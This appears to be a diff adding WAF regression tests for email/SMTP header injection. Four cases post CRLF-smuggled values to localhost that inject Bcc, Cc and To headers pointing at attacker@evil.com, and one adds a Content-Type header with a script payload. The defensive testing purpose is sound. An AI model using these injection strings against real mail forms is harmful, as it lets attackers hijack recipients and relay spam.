@@ -1,0 +1,66 @@
+meta:
+  author: "Antigravity"
+  description: "Email/SMTP Header Injection Tests"
+  enabled: true
+  name: "973-email-injection"
+tests:
+  - test_id: 973100
+    desc: "Email Injection: BCC Header"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "to=victim@example.com%0ABcc:attacker@evil.com&subject=Test&body=Hello"
+          output:
+            log_contains: "id \"973"
+  - test_id: 973101
+    desc: "Email Injection: CC Header"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/json"
+            data: "{\"email\": \"user@test.com\\nCc: attacker@evil.com\"}"
+          output:
+            log_contains: "id \"973"
+  - test_id: 973102
+    desc: "Email Injection: Multiple Recipients"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "recipient=victim@example.com%0d%0aTo:attacker@evil.com"
+          output:
+            log_contains: "id \"973"
+  - test_id: 973103
+    desc: "Email Injection: Content-Type Header"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "from=user@example.com%0AContent-Type:text/html&message=<script>alert(1)</script>"
+          output:
+            log_contains: "id \"973"
